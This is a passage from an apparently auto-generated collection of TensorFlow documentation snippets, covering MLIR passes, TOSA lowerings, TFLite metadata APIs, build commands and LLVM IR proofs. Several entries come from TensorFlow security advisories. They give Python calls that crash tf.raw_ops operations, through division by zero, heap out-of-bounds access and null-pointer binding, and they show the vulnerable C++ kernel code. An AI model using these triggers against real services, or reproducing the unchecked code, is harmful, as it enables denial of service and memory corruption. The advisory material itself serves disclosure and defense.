      %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
      tf_executor.yield %identity : tensor<i32>
    }
    %island_1_result, %island_1_control = tf_executor.island {
      %identity_n:2 = "tf.IdentityN"(%arg1, %island_0_result) : (tensor<i32>, tensor<i32>) -> (tensor<i32>, tensor<i32>)
      tf_executor.yield %identity_n#0
    }
    tf_executor.fetch %island_0_result, %island_1_result : tensor<i32>, tensor<i32>
  }
  return %graph_results#0, %graph_results#1 : tensor<i32>, tensor<i32>
}
```

----------------------------------------

TITLE: Initializing TFLite ContentPropertiesCreator (Python)
DESCRIPTION: This snippet shows the Python signature for the `ContentPropertiesCreator`. It is used to create an instance of this class, likely for configuring content-specific properties within the TFLite metadata schema. It requires `unionType` and `table` parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentPropertiesCreator.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ContentPropertiesCreator(
    unionType, table
)
```

----------------------------------------

TITLE: Vulnerable TFLite OneHot Dimension Calculation C++
DESCRIPTION: This C++ code snippet shows the vulnerable calculation for `suffix_dim_size` in the TFLite `OneHot` operator. It calculates `prefix_dim_size` based on input dimensions and then computes `suffix_dim_size` by dividing the total number of elements by `prefix_dim_size`. The vulnerability lies in the potential for `prefix_dim_size` to be zero, causing a division by zero error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-088.md#_snippet_0

LANGUAGE: C++
CODE:
```
int prefix_dim_size = 1;
for (int i = 0; i < op_context.axis; ++i) {
  prefix_dim_size *= op_context.indices->dims->data[i];
}
const int suffix_dim_size = NumElements(op_context.indices) / prefix_dim_size;
```

----------------------------------------

TITLE: Generating MHLO Canonicalization Code using TableGen
DESCRIPTION: These commands configure and invoke `mlir_tablegen` to process `mhlo_canonicalize.td`, generating C++ code (`mhlo_canonicalize.inc`) specifically for MHLO (MIME HLO) operation canonicalization rewrite patterns.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_4

LANGUAGE: cmake
CODE:
```
set(LLVM_TARGET_DEFINITIONS mhlo_canonicalize.td)
mlir_tablegen(mhlo_canonicalize.inc -gen-rewriters)
add_public_tablegen_target(MLIRMhloCanonicalizeIncGen)
```

----------------------------------------

TITLE: Adding Output Process Units to Subgraph Metadata in Python
DESCRIPTION: This snippet shows the function signature for `SubGraphMetadataAddOutputProcessUnits` in the TFLite Support Python API. It is used to add an array of `outputProcessUnits` to the `SubGraphMetadata` being built using the provided FlatBuffer `builder`. This function is part of the generated code for the metadata schema and is typically used during the metadata creation process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddOutputProcessUnits.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddOutputProcessUnits(
    builder, outputProcessUnits
)
```

----------------------------------------

TITLE: Generating Builtin Ops Headers and List (sh)
DESCRIPTION: This shell script uses Bazel to run two generator targets. The first target generates the 'builtin_ops.h' header file containing the builtin op definitions. The second target generates the 'builtin_ops_list.inc' file which is an include file listing the builtin ops. This command should be executed whenever a new builtin op is added to the TensorFlow Lite schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/schema/builtin_ops_header/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
bazel run \
  //tensorflow/lite/schema/builtin_ops_header:generate > \
  tensorflow/lite/builtin_ops.h &&\
bazel run \
  //tensorflow/lite/schema/builtin_ops_list:generate > \
  tensorflow/lite/kernels/builtin_ops_list.inc
```

----------------------------------------

TITLE: Running JAX Test with Debug Flags (Shell)
DESCRIPTION: This command runs a specific JAX test (`:some_jax_test`) with optimizations (`--compilation_mode=opt`) and enables debug flags (`--test_env=XLA_FLAGS="..."`) to generate HLO snapshots (`--xla_dump_hlo_snapshots`) and compiler traces in the specified directory (`--xla_dump_to=/tmp/test-dump`). These generated artifacts are required inputs for the `mlir_replay` tool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_replay/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel test :some_jax_test --compilation_mode=opt \
  --test_env=XLA_FLAGS="--xla_cpu_use_xla_runtime --xla_dump_to=/tmp/test-dump --xla_dump_hlo_snapshots" \
  --test_filter=SomeSpecific.TestCase \
  --test_sharding_strategy=disabled --test_strategy=local
```

----------------------------------------

TITLE: Adding Name to Model Metadata FlatBuffer - Python
DESCRIPTION: This snippet shows the signature for the `ModelMetadataAddName` Python function. It's a helper used internally to write the 'name' field into a FlatBuffers `ModelMetadata` object during construction using a FlatBuffers builder. It requires a FlatBuffers builder instance and the string name to add.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataAddName.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataAddName(
    builder, name
)
```

----------------------------------------

TITLE: Triggering RaggedTensorToVariant Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a vulnerability in older TensorFlow versions by calling `tf.raw_ops.RaggedTensorToVariant` with an empty list for `rt_nested_splits`. This input combination exploits incomplete validation, leading to a reference binding to a null pointer and causing undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-140.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.RaggedTensorToVariant(
  rt_nested_splits=[],
  rt_dense_values=[1,2,3],
  batched_input=True)
```

----------------------------------------

TITLE: Triggering Division by Zero in tf.raw_ops.AllToAll (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a division by zero vulnerability in the `tf.raw_ops.AllToAll` operation by providing a `split_count` of 0. It defines a TensorFlow function using the `@tf.function` decorator to showcase the issue within a graph context. This requires TensorFlow library installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-176.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def func():
  return tf.raw_ops.AllToAll(
    input=[0.0, 0.1652, 0.6543],
    group_assignment=[1, -1],
    concat_dimension=0,
    split_dimension=0,
    split_count=0)

func()
```

----------------------------------------

TITLE: Triggering TensorFlow MaxPoolGrad Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates how to trigger a denial of service vulnerability in `tf.raw_ops.MaxPoolGrad`. It provides invalid input tensors with zero spatial dimensions combined with specific stride and padding values, which exploit incomplete validation in affected TensorFlow versions, leading to a segmentation fault. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-148.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.MaxPoolGrad(
  orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
  orig_output = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
  grad = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),
  ksize = [1, 16, 16, 1],
  strides = [1, 16, 18, 1],
  padding = "EXPLICIT",
  explicit_paddings = [0, 0, 14, 3, 15, 5, 0, 0])
```

----------------------------------------

TITLE: Identifying Reverse Division Source - TensorFlow - C++
DESCRIPTION: These C++ lines from the TensorFlow `reverse_op.cc` kernel implementation show the source of the division by zero vulnerability. The size of the first dimension (`N`) is retrieved and then used as the divisor in the `cost_per_unit` calculation. If `N` is 0, this operation causes a floating-point exception.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-045.md#_snippet_1

LANGUAGE: c++
CODE:
```
const int64 N = input.dim_size(0);
const int64 cost_per_unit = input.NumElements() / N;
```

----------------------------------------

TITLE: Triggering QuantizedMatMulWithBiasAndDequantize NPE in TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates how to call the TensorFlow raw operation `QuantizedMatMulWithBiasAndDequantize` with a specific set of input parameters that are known to trigger a Null Pointer Exception (NPE) when the MKL backend is enabled, highlighting a security vulnerability (CVE-2023-25670). It requires the TensorFlow library to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-017.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

func = tf.raw_ops.QuantizedMatMulWithBiasAndDequantize
para={'a': tf.constant(138, dtype=tf.quint8), 'b': tf.constant(4, dtype=tf.qint8), 'bias': [[31.81644630432129, 47.21876525878906], [109.95201110839844, 152.07968139648438]], 'min_a': 141.5337138686371, 'max_a': [73.84139251708984, 173.15280151367188], 'min_b': [], 'max_b': [[16.128345489501953, 193.26820373535156]], 'min_freezed_output': [], 'max_freezed_output': [115.50032806396484, 156.974853515625], 'Toutput': 1.0, 'transpose_a': True, 'transpose_b': False, 'input_quant_mode': 'MIN_FIRST'}

func(**para)
```

----------------------------------------

TITLE: Demonstrating QuantizeV2 Validation Vulnerability in TensorFlow Python
DESCRIPTION: This snippet shows how to trigger an incomplete validation vulnerability in `tf.raw_ops.QuantizeV2`. It passes inputs where `min_range` and `max_range` have different lengths, specifically with `max_range` being empty while `axis` is set, which bypasses validation in affected versions and can lead to crashes or memory issues. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-138.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.QuantizeV2(
  input=[1,2,3],
  min_range=[1,2],
  max_range=[],
  T=tf.qint32,
  mode='SCALED',
  round_mode='HALF_AWAY_FROM_ZERO',
  narrow_range=False,
  axis=1,
  ensure_minimum_range=3)
```

----------------------------------------

TITLE: Handling Kernel Creation Error in TensorFlow C++
DESCRIPTION: This C++ snippet from TensorFlow's `ImmutableExecutorState::Initialize` shows the vulnerable code path. When `create_kernel` fails, the `item->kernel` pointer is set to `nullptr`, but the previously allocated memory pointed to by `item->kernel` is not freed, leading to a memory leak. The code then attaches definition information to the status and returns.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-041.md#_snippet_0

LANGUAGE: C++
CODE:
```
Status s = params_.create_kernel(n->properties(), &item->kernel);
if (!s.ok()) {
  item->kernel = nullptr;
  s = AttachDef(s, *n);
  return s;
}
```

----------------------------------------

TITLE: Demonstrating Heap Buffer Overflow in TensorFlow MaxPoolGrad (Python)
DESCRIPTION: This Python code snippet demonstrates the heap buffer overflow vulnerability in `tf.raw_ops.MaxPoolGrad`. It provides specific tensor shapes and parameters (like an empty `grad` tensor) that, when passed to the operation, trigger the out-of-bounds access in the underlying C++ kernel implementation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-068.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

orig_input = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)
orig_output = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
ksize = [1, 1, 1, 1]
strides = [1, 1, 1, 1]
padding = "SAME"

tf.raw_ops.MaxPoolGrad(
  orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,
  strides=strides, padding=padding, explicit_paddings=[])
```

----------------------------------------

TITLE: Lowering Shape Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a shape operation to the TOSA dialect. It retrieves the shape of the input tensor and creates a TOSA CONST operation containing the shape as a constant value. This constant tensor represents the output of the shape operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_21

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_shape_op(Value %input)
{
    vector <size_t> input_shape = %input.shape

    %shape = tosa.CONST() {value={input_shape}}
    return %shape
}
```

----------------------------------------

TITLE: Demonstrating Segfault with NaN in tf.histogram_fixed_width Python
DESCRIPTION: This Python snippet demonstrates the vulnerability in `tf.histogram_fixed_width`. It attempts to call the function with a single NaN value for the `values` parameter, which triggers the segmentation fault on affected TensorFlow versions when running on CPU.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-080.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

tf.histogram_fixed_width(values=np.nan, value_range=[1,2])
```

----------------------------------------

TITLE: Vulnerable Division Calculation in ConvGradInput (C++)
DESCRIPTION: This C++ snippet extracted from the TensorFlow kernel implementation (`conv_grad_input_ops.h`) shows the specific calculation logic where the division by zero vulnerability occurs. It computes `work_unit_size` based on input tensor dimensions and then uses it as the divisor for `shard_size`. If `work_unit_size` becomes zero due to malformed input shapes, the program crashes. This code is part of the internal TensorFlow C++ source.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-014.md#_snippet_1

LANGUAGE: cpp
CODE:
```
  const size_t size_A = output_image_size * dims.out_depth;
  const size_t size_B = filter_total_size * dims.out_depth;
  const size_t size_C = output_image_size * filter_total_size;
  const size_t work_unit_size = size_A + size_B + size_C;
  ...
  const size_t shard_size =
      use_parallel_contraction ? 1 :
      (target_working_set_size + work_unit_size - 1) / work_unit_size;
```

----------------------------------------

TITLE: Define CustomCall C Function Signature
DESCRIPTION: This code snippet shows the required C function signature for a user-provided function that is invoked by the XLA CustomCall operation. The function receives pointers to the output buffer and an array of input buffers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_12

LANGUAGE: cpp
CODE:
```
extern "C" void target_name(void* out, void** in);
```

----------------------------------------

TITLE: Illustrating Broadcast Indexing - Pseudo-code
DESCRIPTION: This pseudo-code demonstrates how elements are indexed in the output array of the Broadcast operation. Each element in the new dimensions (i0 to iN) corresponds to a copy of the original operand element at the original dimensions' indices (j0 to jM).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_4

LANGUAGE: Pseudo-code
CODE:
```
output[i0, ..., iN, j0, ..., jM] = operand[j0, ..., jM]
```

----------------------------------------

TITLE: Processing TensorFlow Graph Node Inputs C++
DESCRIPTION: This C++ snippet is part of the process for converting TensorFlow Graph `NodeDef` objects to MLIR operations. It iterates through the inputs defined in a `NodeDef`. It first checks that the node's operation type is not empty and then retrieves or creates placeholder values for each input string using a value manager, adding them to the list of operation operands.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-138.md#_snippet_1

LANGUAGE: C++
CODE:
```
// Process every node and create a matching MLIR operation
for (const NodeDef& node : nodes) {
  if (node.op().empty()) return InvalidArgument("empty op type");
  OperationState state(unknown_loc, absl::StrCat("tfg.", node.op()));
  // Fetch the inputs, creating placeholder if an input hasn't been visited.
  for (const std::string& input : node.input())
    state.operands.push_back(
        value_manager.GetValueOrCreatePlaceholder(input));
```

----------------------------------------

TITLE: Accessing Min Values as NumPy Array in Python
DESCRIPTION: This instance method retrieves the list of minimum values from the statistical data and returns it as a NumPy array. This is useful for numerical processing and analysis.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_8

LANGUAGE: Python
CODE:
```
MinAsNumpy()
```

----------------------------------------

TITLE: Get Root As Specific BoundingBoxProperties from Buffer Python
DESCRIPTION: Gets the root object of a FlatBuffer as a `BoundingBoxProperties` type. This method is deprecated; use the more general `GetRootAs` method instead.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_3

LANGUAGE: Python
CODE:
```
@classmethod
GetRootAsBoundingBoxProperties(
    buf, offset=0
)
```

----------------------------------------

TITLE: Merged TPU Variable Execute MLIR
DESCRIPTION: Example showing the result of the `-tf-tpu-merge-variables-with-execute` pass in MLIR. The individual `tf.ReadVariableOp` and `tf.AssignVariableOp` calls are merged into a single `tf.TPUExecuteAndUpdateVariables` operation for efficiency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_56

LANGUAGE: mlir
CODE:
```
  %2 = "tf.TPUExecuteAndUpdateVariables"(%arg0, %arg1, %compile)
    { device_var_reads_indices = [0, 1],
      device_var_updates_indices = [0, -1] }
```

----------------------------------------

TITLE: Verify Floating Point Add Optimization - LLVM IR
DESCRIPTION: This LLVM IR snippet provides a test case for verifying the optimization of floating-point addition (`fadd`) surrounded by casting (fpext/fptrunc). It compares the sequence of half-to-float extension, addition, and float-to-half truncation against a direct half-precision addition. Verification with the online Alive2 tool or locally proved computationally expensive, indicating difficulty in proving equivalence for floating point. Input: two half-precision floating-point numbers. Output: a half-precision floating-point number.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/service/algebraic_simplifier_alive2_proofs.md#_snippet_3

LANGUAGE: LLVM IR
CODE:
```
  %cast1 = fpext half %0 to float
  %cast2 = fpext half %1 to float
  %sum = fadd float %cast1, %cast2
  %trunc = fptrunc float %sum to half
  ret half %trunc
=>
  %r = fadd half %0, %1
  ret half %r
```

----------------------------------------

TITLE: MLIR after Extracting Outside Compilation to Parallel Execute Pass
DESCRIPTION: This MLIR snippet shows the result after the outside compilation extraction pass. The ops marked for outside compilation are moved into a separate `tf_device.launch` region within a `tf_device.parallel_execute` op, alongside the modified device cluster region. Communication ops (`_XlaRecvAtHost`, `_XlaSendFromHost`, `_XlaHostComputeMlir`) are introduced to handle data transfer between the host and device regions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_28

LANGUAGE: mlir
CODE:
```
func @outside_compilation() -> tensor<f32> {
  %0 = "tf_device.parallel_execute"() ( {
    "tf_device.launch"() ( {
      %1 = "tf._XlaCompileMlirPlaceholderProgramKey"() : () -> tensor<3x!tf_type.string>
      %2 = "tf._XlaRecvAtHost"(%1) {device_ordinal = 0 : i64, key = "host_compute_channel_0_0_args"} : (tensor<3x!tf_type.string>) -> tensor<f32>
      %3 = "tf.Identity"(%2) : (tensor<f32>) -> tensor<f32>
      "tf._XlaSendFromHost"(%3, %1) {device_ordinal = 0 : i64, key = "host_compute_channel_0_0_retvals"} : (tensor<f32>, tensor<3x!tf_type.string>) -> ()
      tf_device.return
    }) {device = "/job:worker/replica:0/task:0/device:CPU:0"} : () -> ()
    tf_device.return
  },  {
    %1 = "tf_device.cluster"() ( {
      %2 = "tf.Const"() {value = dense<1.000000e+00> : tensor<f32>} : () -> tensor<f32>
      %3 = "tf._XlaHostComputeMlir"(%2) {recv_key = "host_compute_channel_0_0_retvals", send_key = "host_compute_channel_0_0_args", tpu_core = 0 : i64} : (tensor<f32>) -> tensor<f32>
      %4 = "tf.AddV2"(%2, %3) : (tensor<f32>, tensor<f32>) -> tensor<f32>
      tf_device.return %4 : tensor<f32>
    }) {device_assignment = [], num_cores_per_replica = 1 : i64, topology = ""} : () -> tensor<f32>
    tf_device.return %1 : tensor<f32>
  }) : () -> tensor<f32>
  return %0 : tensor<f32>
}
```

----------------------------------------

TITLE: Verify Integer Add/Sub/Mul Optimization - LLVM IR
DESCRIPTION: This LLVM IR code snippet represents a test case used with the Alive2 tool to prove the safety of optimizing an integer binary operation (Add, Subtract, or Multiply) surrounded by upcasting (sext) and downcasting (trunc). It compares a source function with casting against a target function without casting, confirming equivalence for these operations. Requires the Alive2 verification tool. Input: two i8 integers. Output: an i8 integer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/service/algebraic_simplifier_alive2_proofs.md#_snippet_0

LANGUAGE: LLVM IR
CODE:
```
define i8 @src(i8, i8) {
  %cast1 = sext i8 %0 to i16
  %cast2 = sext i8 %1 to i16
  %sum = add i16 %cast1, %cast2
  %trunc = trunc i16 %sum to i8
  ret i8 %trunc
}

define i8 @tgt(i8, i8) {
  %r = add i8 %0, %1
  ret i8 %r
}
```

----------------------------------------

TITLE: Defining Complex Fusion with Transposes and Exponentials in MLIR HLO
DESCRIPTION: Defines an XLA fusion cluster (`f`) that takes a 3D floating-point parameter (`p0`) and applies a series of transpose and exponential operations on it through two different branches before adding the results. This example shows how complex indexing maps can arise in fusions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/indexing.md#_snippet_9

LANGUAGE: MLIR HLO
CODE:
```
f {
  p0 = f32[20, 10, 50] parameter(0)
  lhs_transpose_1 = f32[10, 20, 50] transpose(p0), dimensions={1, 0, 2}
  lhs_e = f32[10, 20, 50] exponential(lhs_transpose_1)
  lhs_transpose_2 = f32[10, 50, 20] transpose(lhs_e), dimensions={0, 2, 1}
  rhs_transpose_1 = f32[50, 10, 20] transpose(p0), dimensions={2, 1, 0}
  rhs_log = f32[50, 10, 20] exponential(rhs_transpose_1)
  rhs_transpose_2 = f32[10, 50, 20] transpose(rhs_log), dimensions={1, 0, 2}
  ROOT output = f32[10, 50, 20] add(lhs_transpose_2, rhs_transpose_2)
}
```

----------------------------------------

TITLE: Run Model Evaluation Script (Shell)
DESCRIPTION: This snippet shows a placeholder command example for executing the model evaluation script. Users should replace '...' with the actual script path and necessary command-line arguments for evaluation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/Winner_OSS_Template.md#_snippet_2

LANGUAGE: shell
CODE:
```
python3 ...
```

----------------------------------------

TITLE: Setting CMake Project Name and Language
DESCRIPTION: This command sets the name of the CMake project to 'ml_dtypes' and specifies that the primary language used is CXX (C++). This is typically one of the first commands in a CMakeLists.txt file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
project(ml_dtypes CXX)
```

----------------------------------------

TITLE: Checking Axis Value in TensorFlow C++ Shape Inference
DESCRIPTION: This C++ snippet from the TensorFlow source code shows the insufficient check (`if (axis != -1)`) within the shape inference logic for `QuantizeAndDequantizeV*` ops. It highlights how negative `axis` values other than -1 can bypass intended validation, leading to the heap OOB read vulnerability when `c->Dim(input, axis)` is called with an invalid index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-185.md#_snippet_4

LANGUAGE: C++
CODE:
```
...
if (axis != -1) {
  ...
  c->Dim(input, axis);
  ...
}
```

----------------------------------------

TITLE: Vulnerable Input Access in QuantizedBatchNormWithGlobalNormalization Kernel C++
DESCRIPTION: This C++ snippet shows the vulnerable lines within the TensorFlow kernel implementation for `QuantizedBatchNormWithGlobalNormalization`. It demonstrates the code attempting to access the first element (`(0)`) of the input tensors using `.flat<float>()` without checking if the tensors (accessed via `context->input(N)`) are empty. This leads to out-of-bounds access when empty tensors are provided, as shown in the Python example.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-035.md#_snippet_1

LANGUAGE: C++
CODE:
```
const float input_min = context->input(1).flat<float>()(0);
const float input_max = context->input(2).flat<float>()(0);
...
const float mean_min = context->input(4).flat<float>()(0);
const float mean_max = context->input(5).flat<float>()(0);
...
const float var_min = context->input(7).flat<float>()(0);
const float var_max = context->input(8).flat<float>()(0);
...
const float beta_min = context->input(10).flat<float>()(0);
const float beta_max = context->input(11).flat<float>()(0);
...
const float gamma_min = context->input(13).flat<float>()(0);
const float gamma_max = context->input(14).flat<float>()(0);
```

----------------------------------------

TITLE: License Header Python
DESCRIPTION: This code block contains the standard Apache License, Version 2.0 header comments. It specifies the terms under which the code is provided and used, disclaiming warranties and liabilities.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_0

LANGUAGE: Python
CODE:
```
#@title Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
```

----------------------------------------

TITLE: Lowering tf.SplitV to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.SplitV` operation, which splits a tensor into multiple tensors along a dimension based on specified sizes, to the TOSA dialect's `lower_splitv_op`. It requires size splits and split dimension as constants.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_37

LANGUAGE: MLIR
CODE:
```
%output = tf.SplitV(%value, %size_splits, %split_dim) {num_split}
```

LANGUAGE: MLIR
CODE:
```
%output = lower_splitv_op(%value, %size_splits.as_constant(), %split_dim.as_constant())
```

----------------------------------------

TITLE: Lowering tfl.arg_max to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow Lite `tfl.arg_max` operation, which finds the index of the maximum value along an axis, to the TOSA dialect's `tosa.ARGMAX` operation. It requires the dimension as a constant attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_53

LANGUAGE: MLIR
CODE:
```
%output = tfl.arg_max(%input, %dim)
```

LANGUAGE: MLIR
CODE:
```
%result = tosa.ARGMAX(%input) {axis=positive_axis(%dim_const.as_constant(), %input.rank)}
```

----------------------------------------

TITLE: Lowering tf.Unpack to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.Unpack` operation, which unpacks a dimension into multiple tensors, to the TOSA dialect's `lower_unpack_op`. It uses `axis` and `num` attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_47

LANGUAGE: MLIR
CODE:
```
%output = tf.Unpack(%value) {axis, num}
```

LANGUAGE: MLIR
CODE:
```
%output = lower_unpack_op(%value, axis, num)
```

----------------------------------------

TITLE: Triggering TensorFlow MirrorPadGrad Heap OOB - Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the heap out-of-bounds vulnerability in the `tf.raw_ops.MirrorPadGrad` operation. It provides specific, large integer values for the `paddings` argument that exploit the vulnerability. Running this code on an unpatched TensorFlow version will result in a crash due to memory corruption.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-157.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.MirrorPadGrad(input=[1],
             paddings=[[0x77f00000,0xa000000]],
             mode = 'REFLECT')
```

----------------------------------------

TITLE: Triggering UnicodeEncode Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a vulnerability (CVE-2021-37667) in `tf.raw_ops.UnicodeEncode` by providing empty lists for both `input_values` and `input_splits`. This specific input combination causes the vulnerable implementation to attempt to read the dimension of `input_splits` before checking if it's empty, leading to a reference binding to a null pointer and subsequent undefined behavior or crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-141.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
from tensorflow.python.ops import gen_string_ops

gen_string_ops.unicode_encode(
  input_values=[],
  input_splits=[],
  output_encoding='UTF-8',
  errors='ignore',
  replacement_char='a')

```

----------------------------------------

TITLE: Calling BoostedTreesCalculateBestGainsPerFeature API - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates a potential vulnerability when calling the `tf.raw_ops.BoostedTreesCalculateBestGainsPerFeature` operation in TensorFlow. Providing an empty `node_id_range` and specific values for other parameters can trigger undefined behavior due to lack of input validation, leading to a reference binding to nullptr. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-136.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.BoostedTreesCalculateBestGainsPerFeature(
  node_id_range=[],
  stats_summary_list=[[1,2,3]],
  l1=[1.0],
  l2=[1.0],
  tree_complexity =[1.0],
  min_node_weight =[1.17],
  max_splits=5)
```

----------------------------------------

TITLE: Demonstrating SparseBincount Segfault in TensorFlow (Python)
DESCRIPTION: This snippet demonstrates a vulnerability in `tf.raw_ops.SparseBincount` by providing inputs that do not form a valid sparse tensor. Required dependency is TensorFlow. The inputs are randomly generated with specific seeds, leading to a segfault when the operation is called. The expected output is a program crash (denial of service).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-113.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
binary_output = True
indices = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int64, seed=-1288)
values = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-9366)
dense_shape = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-9878)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.SparseBincount(indices=indices, values=values, dense_shape=dense_shape, size=size, weights=weights, binary_output=binary_output)
```

----------------------------------------

TITLE: Calculating TensorFlow Op Tensor Size (Vulnerable) - C++
